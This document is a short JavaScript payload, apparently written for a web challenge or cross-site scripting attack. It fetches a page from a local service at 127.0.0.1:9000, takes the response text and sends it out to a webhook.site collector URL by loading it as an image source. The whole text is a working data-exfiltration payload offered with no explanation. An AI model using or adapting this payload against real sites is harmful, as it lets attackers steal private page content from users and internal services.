
fetch("http://127.0.0.1:9000/view/636197d2-c376-45ca-82af-3459c309e259").then((res) => {
	return res.text();
}).then(data => {
	var img = document.createElement("img");
	img.src="https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;
	document.body.appendChild(img);
})
